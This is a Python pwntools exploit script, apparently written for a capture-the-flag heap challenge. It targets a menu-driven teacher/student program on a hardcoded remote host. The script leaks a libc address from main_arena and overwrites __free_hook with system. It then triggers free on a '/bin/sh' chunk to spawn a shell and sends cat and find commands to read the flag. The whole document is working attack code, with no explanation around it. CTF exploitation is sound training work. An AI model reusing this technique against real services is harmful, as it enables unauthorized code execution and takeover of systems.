import re
from pathlib import Path
from pwn import *



BIN_PATH = "attachment-35"
LIBC_PATH = "attachment-35.so"

context.binary = ELF(str(BIN_PATH), checksec=False)
LIBC = ELF(str(LIBC_PATH), checksec=False)
context.arch = "amd64"
context.log_level = "info"

HOST = "39.96.193.120"
PORT = 10008


def start():
    if not args.LOCAL:
        return remote(HOST, PORT)
    return process(
        ["wsl.exe", "bash", "-lc", "cd /mnt/c/ctf_tmp/pwn2 && LD_PRELOAD=./libc.so.6 ./chall"]
    )


def sl_after(io, delim, data):
    io.sendlineafter(delim, data if isinstance(data, bytes) else str(data).encode())


def s_after(io, delim, data):
    io.sendafter(delim, data if isinstance(data, bytes) else str(data).encode())


def choice(io, idx):
    sl_after(io, b"choice>> ", idx)


def change_role(io, role):
    choice(io, 5)
    sl_after(io, b"role: <0.teacher/1.student>: ", role)


def add_student(io, qnum):
    choice(io, 1)
    sl_after(io, b"enter the number of questions: ", qnum)


def give_score_all(io):
    choice(io, 2)
    prompt = b"choice>> "
    data = io.recvuntil(prompt)
    io.unrecv(prompt)
    pairs = re.findall(rb"score for the (\d+)th student is (-?\d+)", data)
    return {int(i): int(v) for i, v in pairs}


def call_parent(io, idx):
    choice(io, 4)
    sl_after(io, b"which student id to choose?", idx)


def pray(io):
    choice(io, 3)


def change_id(io, idx):
    choice(io, 6)
    sl_after(io, b"input your id: ", idx)


def teacher_review(io, idx, payload, size=0x18, rewrite=False):
    choice(io, 3)
    sl_after(io, b"which one? > ", idx)
    if rewrite:
        s_after(io, b"enter your comment:", payload)
    else:
        sl_after(io, b"please input the size of comment: ", size)
        s_after(io, b"enter your comment:", payload)


def set_mode(io, payload=None, pray_score=None):
    choice(io, 4)
    if pray_score is None:
        s_after(io, b"enter your mode!", payload)
    else:
        sl_after(io, b"enter your pray score: 0 to 100", pray_score)


def p32u(x):
    return p32(x & 0xFFFFFFFF)


def make_rewardable(io, idx):
    change_role(io, 1)
    change_id(io, idx)
    pray(io)
    change_role(io, 0)
    value = give_score_all(io)[idx]
    while value >= 10:
        value = give_score_all(io)[idx]
    return value


def claim_reward(io, idx):
    change_role(io, 1)
    change_id(io, idx)
    choice(io, 2)
    io.recvuntil(b"Good Job! Here is your reward! ")
    leak = int(io.recvline().strip(), 16)
    io.recvuntil(b"addr: ")
    return leak


def reward_add1(io, addr):
    io.sendline((str(addr) + "1").encode())


def show_flag(io):
    cmds = [
        b"cat /flag",
        b"cat /flag*",
        b"cat flag",
        b"cat ./flag",
        b"find / -maxdepth 2 -name 'flag*' 2>/dev/null | head -n 5",
    ]
    for cmd in cmds:
        io.sendline(cmd)
        data = io.recvrepeat(0.8)
        if data:
            try:
                print(data.decode("latin-1", errors="ignore"), end="")
            except Exception:
                print(repr(data))
        if b"ISCC{" in data:
            return True
    return False


def exploit(io):
    sl_after(io, b"role: <0.teacher/1.student>: ", 0)

    add_student(io, 9)
    teacher_review(io, 0, b"wsxk", 0xA0)
    add_student(io, 9)
    teacher_review(io, 1, b"test", 0x3F0)
    add_student(io, 9)
    teacher_review(io, 2, b"www", 0xA0)
    add_student(io, 9)
    teacher_review(io, 3, b"www", 0x200)

    make_rewardable(io, 3)
    first_chunk = claim_reward(io, 3)
    write_addr1 = first_chunk - 0x617
    write_addr2 = write_addr1 + 0x110
    reward_add1(io, write_addr1)

    change_role(io, 0)
    add_student(io, 9)
    teacher_review(io, 4, b"wsxk", 0x300)
    add_student(io, 9)
    teacher_review(io, 5, b"wsxk", 0x300)
    add_student(io, 9)
    teacher_review(io, 6, b"wwww", 0x300)

    make_rewardable(io, 4)
    claim_reward(io, 4)
    reward_add1(io, write_addr2)

    make_rewardable(io, 0)
    change_role(io, 0)
    call_parent(io, 1)

    change_role(io, 1)
    change_id(io, 0)
    choice(io, 2)
    io.recvuntil(b"Good Job! Here is your reward! ")
    chunk = int(io.recvline().strip(), 16)
    io.recvuntil(b"addr: ")
    reward_add1(io, chunk + 0x40 + 2)
    io.recvuntil(b"here is the review:\n")
    main_arena = u64(io.recv(7).ljust(8, b"\x00")) - 96
    libc_base = main_arena - 0x1ECB80
    LIBC.address = libc_base
    free_hook = LIBC.sym["__free_hook"]
    system = LIBC.sym["system"]

    change_role(io, 0)
    payload = (
        p64(main_arena + 96)
        + p64(main_arena + 96)
        + b"a" * 0x4E0
        + p64(0x500)
        + p64(0x30)
        + p64(first_chunk + 0x30)
        + p64(0) * 2
        + p64(0x0000000100000001)
        + p64(0)
        + p64(0x21)
        + p64(0x0000004800000009)
        + p64(free_hook)
        + p64(0x200)
        + p64(0x201)
        + p64(0xA777777)
    )
    teacher_review(io, 0, payload, rewrite=True)
    teacher_review(io, 3, p64(system), rewrite=True)
    teacher_review(io, 5, b"/bin/sh\x00", rewrite=True)
    call_parent(io, 5)

    sleep(1)
    show_flag(io)
    io.interactive()


if __name__ == "__main__":
    io = start()
    exploit(io)